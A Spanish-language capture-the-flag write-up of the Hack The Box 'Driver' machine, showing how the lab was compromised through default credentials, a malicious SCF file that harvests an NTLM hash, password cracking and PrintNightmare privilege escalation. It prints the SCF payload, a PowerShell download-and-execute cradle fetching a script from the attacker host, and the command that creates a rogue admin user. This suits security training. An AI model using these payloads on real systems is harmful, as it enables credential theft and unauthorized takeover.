---
title: Drive - Hack The Box
date: 2023-08-15
#classes: wide
#toc: true
#toc_label: "Contenido"
#toc_icon: "fire"
header:
  teaser: /assets/img/HackTheBox/Driver/Driver-icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - Password Guessing
  - SCF Malicious File
  - Print Spooler Local Privilege Escalation (PrintNightmare) [CVE-2021-1675]
---


![](/assets/img/HackTheBox/Driver/init.png)

Hoy vamos a estar resolviendo la máquina **Drive** de la plataforma HackTheBox. Esta máquina es **Windows** y se enfoca en la explotación de impresoras.

La enumeración revela que un servidor web está escuchando en el puerto 80, junto con el puerto 445 y WinRM en el puerto 5985. La navegación al sitio web revela que está protegido mediante autenticación HTTP básica. Al probar las credenciales comunes, nos acepta "admin:admin" y podemos visitar la página web. La página proporciona una función para cargar firmwares de impresoras en un recurso compartido SMB para que un equipo remoto los pruebe y verifique.

Cargamos un archivo SCF malicioso que contiene un comando para obtener un archivo remoto de nuestra máquina local, lo cual conduce al hash NTLM del usuario `tony`, que nos transmitimos. Al descifrar el hash capturado para recuperar una contraseña en texto plano, podemos iniciar sesión como `tony`, usando `evil-winrm`. Lanzamos la herramienta `WinPEAS.exe` para enumerar todo el sistema, ver servicios mal configurados, etc. Descubrimos que la máquina es vulnerable a CVE-2021-1675, que es una vulnerabilidad crítica de ejecución remota de código y escalada local de privilegios apodada "PrintNightmare".

----------------------

# Ping

Iniciamos probando que tenemos conectividad con la máquina víctima. Esto lo hacemos con el comando `ping`.

Lo que vamos a hacer es enviar un paquete a la máquina y si en el output vemos que un paquete se transmitió y un paquete se recibió, eso quiere decir que la máquina nos respondió con un paquete, por lo tanto, tenemos conectividad. También vemos algo llamado `ttl` y a través de él podemos saber ante qué sistema operativo nos estamos enfrentando. Si el `ttl` es `128`, es `Windows`. Si el `ttl` es `64`, es `Linux`.

En HackTheBox, hay un nodo intermediario, por lo tanto, el `ttl` aquí será `127` en lugar de `128` y `63` en lugar de `64`.

Bueno, lanzamos el comando.

```
ping -c 1 10.129.95.238
```

Tenemos conectividad.

![](/assets/img/HackTheBox/Driver/ping.png)

-----------------------------

## Reconocimiento

Vamos a iniciar con la etapa de `Reconocimiento`, donde el objetivo es recopilar información detallada y relevante sobre el sistema.

En este caso, realizaremos un `Reconocimiento Activo`, en el cual descubriremos puertos y servicios expuestos. Para ello, utilizaremos la herramienta `Nmap`.

### Nmap

Realizaremos un escaneo con `Nmap`.

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.238 -oG allPorts
```

- `-p-`: Indica que se escanearán todos los puertos (del 1 al 65535).
- `--open`: Muestra solo los puertos que están abiertos.
- `-sS`: Utiliza un escaneo SYN (half-open) para determinar el estado de los puertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Habilita el nivel máximo de verbosidad en la salida para obtener información detallada del escaneo.
- `-n`: Desactiva la resolución DNS de nombres de host, lo que acelera el escaneo.
- `-Pn`: Ignora la detección de host y trata todos los objetivos como en línea.
- `10.129.95.238`: Es la dirección IP del objetivo que se va a escanear.
- `-oG allPorts`: Genera una salida en formato greppable (Grep) que se guarda en el archivo "allPorts".

![](/assets/img/HackTheBox/Driver/nmap1.png)

En relación a esos puertos, vamos a ejecutar una serie de scripts básicos de reconocimiento para obtener información sobre los servicios y versiones en los puertos abiertos.

```
nmap -p80,135,445,5985 -sCV 10.129.95.238 -oN targeted
```

- `-p80,135,445,5985`: Escanea específicamente los puertos 80, 135, 445 y 5985 en el objetivo.
- `-sCV`: Utiliza un escaneo de versiones y scripts para obtener información sobre los servicios y versiones en los puertos abiertos.
- `10.129.95.238`: Es la dirección IP del objetivo que se va a escanear.
- `-oN targeted`: Guarda la salida del escaneo en un archivo llamado "targeted".

![](/assets/img/HackTheBox/Driver/nmap2.png)

-------------------------------

## Enumeracion

### SMB

#### smbclient

```
smbclient -L 10.129.95.238 -N
```
![](/assets/img/HackTheBox/Driver/smbclient.png)

#### crackmapexec

```
crackmapexec smb 10.129.95.238
```
![](/assets/img/HackTheBox/Driver/cme.png)

### HTTP:80

Vamos a echar un vistazo al sitio web que está funcionando en el puerto 80, pero parece que cuenta con autenticación básica de HTTP. En este caso, podemos intentar utilizar credenciales por defecto como `admin:admin`.

![](/assets/img/HackTheBox/Driver/http1.png)

El `username` y `password` son `admin:admin`

Estamos dentro.

![](/assets/img/HackTheBox/Driver/http2.png)

Parece que estamos tratando con `MFP Firmware Update Center`, que aparentemente es una página para cargar `firmware` a través de un recurso compartido de SMB.

Lo que destaca aquí es que menciona que `Our team will review the uploads`.

![](/assets/img/HackTheBox/Driver/http3.png)

Por lo tanto puede ser que los tiros vayan por un `SCF Malicious File`.

![](/assets/img/HackTheBox/Driver/google.png)

![](/assets/img/HackTheBox/Driver/scf.png)

Bueno vamos crear un archivo `SCF` 

La idea es decirle que el icono del archivo, quiero que me lo carges de un recurso compartido a nivel de red que esta en mi maquina, a un recurso a nivel de red que voy a llamar `smbFolder` y quiero que me carges un icono que se llama `pentestlab.ico` (Que no tiene porque existir).

```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```
![](/assets/img/HackTheBox/Driver/scffile.png)

## Impacket-smbserver

Ahora lo que sigue es montar un servicio con `impacket-smbserver`. Crearé un recurso compartido a nivel de red llamado `smbFolder` que esté sincronizado con el directorio actual de trabajo usando una ruta absoluta. Dado que se trata de Windows 10, le proporcionaré soporte para la versión 2 de SMB.

```
impacket-smbserver smbFolder $(pwd) -smb2support 
```

Lo dejamos corriendo

![](/assets/img/HackTheBox/Driver/impacket.png)

Cargamos el archivo `pwned.scf`

![](/assets/img/HackTheBox/Driver/upload.png)

![](/assets/img/HackTheBox/Driver/submit.png)

## Capturar Hash

Si subimos el archivo y está visitando el explorador de archivos mientras intenta cargar el icono, dado que el icono se cargará desde mi recurso compartido en la red, para la carga debe haber una autenticación a nivel de red. Por lo tanto, si esto es aplicable, deberíamos ver el `hash`.

![](/assets/img/HackTheBox/Driver/hash.png)

Hay un usuario `tony` que se ve que a estado tratando de visualizar el archivo, a cargado el icono y el icono se lo a cargado desde mi maquina

Bueno lo siguiente seria crackear el `hash`
### John

Vamos a utilizar `john` para crackear el hash NTLMv2

![](/assets/img/HackTheBox/Driver/hash2.png)

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
![](/assets/img/HackTheBox/Driver/john.png)

### user:password
- tony : liltony

`crackmapexec` me dice que son credenciales validas en SMB

![](/assets/img/HackTheBox/Driver/cme2.png)

Recurda que esta el puerto 5985 por lo tanto checamos y nos dio un `pwn3d!`

![](/assets/img/HackTheBox/Driver/cme3.png)

### Evil-WinRM

Ahora mediante `evil-winrm` nos conectamos a la maquina

```
evil-winrm -i 10.129.95.238 -u 'tony' -p 'liltony'
```

![](/assets/img/HackTheBox/Driver/winrm.png)

## User Flag

Ahi tenemos la primer flag

![](/assets/img/HackTheBox/Driver/evil1.png)

La idea ahora es buscar una manera de elevar privilegios

![](/assets/img/HackTheBox/Driver/evil2.png)

### WinPEASx64.exe

Lo que voy hacer ahora es lanzar la herramienta `WinPEASx64.exe` para que me enumere todo el sistema y ver vulnerabilidades

https://github.com/carlospolop/PEASS-ng/releases/tag/20230813-dc8384b3

![](/assets/img/HackTheBox/Driver/winpeas.png)

Una vez me lo descargo lo que hago es pasarlo a la maquina victima

Primero en la maquina windows hay que irnos al directorio `\temp` y despues ahi mismo hacer un `upload`

![](/assets/img/HackTheBox/Driver/evil3.png)

Ejecutamos `winPEASx64.exe`

```
.\winPEASx64.exe
```

Este proceso Hace alusion a una vulnerabilidad reciente relacionado con impresoras

![](/assets/img/HackTheBox/Driver/spoolsv.png)

-------------------------------------

### Privilege Escalation

Una busqueda en google:

![](/assets/img/HackTheBox/Driver/LPE1.png)

Alparecer lo que hace este script es que te crea un usuario a nivel de sistema

![](/assets/img/HackTheBox/Driver/LPE2.png)

Nos descargamos el script.ps1 con `wget`

![](/assets/img/HackTheBox/Driver/wget.png)

Creamos un servidor con python

```
python3 -m http.server 80
```

![](/assets/img/HackTheBox/Driver/python.png)

Despues con la siguiente linea nos descargamos el script en la maquina windows y al mismo tiempo lo ejecutamos con la siguiente operatoria

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/CVE-2021-1675.ps1')
```

![](/assets/img/HackTheBox/Driver/LPE3.png)

Ahora ejecutamos la siguiente linea con el nuevo user y password que le indiques

```
Invoke-Nightmare -DriverName "Xerox" -NewUser "user" -NewPassword "password" 
```

![](/assets/img/HackTheBox/Driver/LPE4.png)

```
net user
```

![](/assets/img/HackTheBox/Driver/LPE5.png)

![](/assets/img/HackTheBox/Driver/LPE6.png)

Ahora solo toca salir e ingresar por `evil-winrm` con el nuevo usuario que es administrador

![](/assets/img/HackTheBox/Driver/evilwin.png)

![](/assets/img/HackTheBox/Driver/evilwin2.png)

## Root Flag

![](/assets/img/HackTheBox/Driver/root.png)

# R00T3D